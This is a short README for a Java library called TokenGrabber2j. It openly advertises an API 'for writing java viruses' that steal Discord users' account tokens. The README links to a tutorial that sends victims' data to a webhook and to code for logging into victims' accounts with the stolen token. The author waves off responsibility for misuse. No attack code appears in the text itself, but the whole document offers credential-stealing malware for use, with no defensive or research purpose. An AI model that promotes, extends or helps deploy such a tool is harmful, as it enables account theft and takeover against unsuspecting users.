# TokenGrabber2j
A simple to use API for writing java viruses to get discord account token of an user.
# LISTEN
**I take no responsibility how you use this java library. If you get banned, you can't blame me later.**
# Installation
You will need to download the latest library jar from the [releases page](https://github.com/m-Phoenix852/TokenGrabber2j/releases) and add it to your project external libraries.  
After that you need to write a simple virus using it. A simple tutorial of the API that sends the information of the user to a webhook can be found [here](https://hastebin.com/ozomoqomes.java).
# Logging in using token
If you want to login to the victim's account using the token, you can use this [javascript code](https://gist.github.com/m-Phoenix852/b47fffb0fd579bc210420cedbda30b61). BUT once again read [this](https://github.com/m-Phoenix852/TokenGrabber2j/#listen)

# LISTEN AGAIN
Don't blame me for lack of documentations, I am lazy to write the documentations but when I do I will announce.
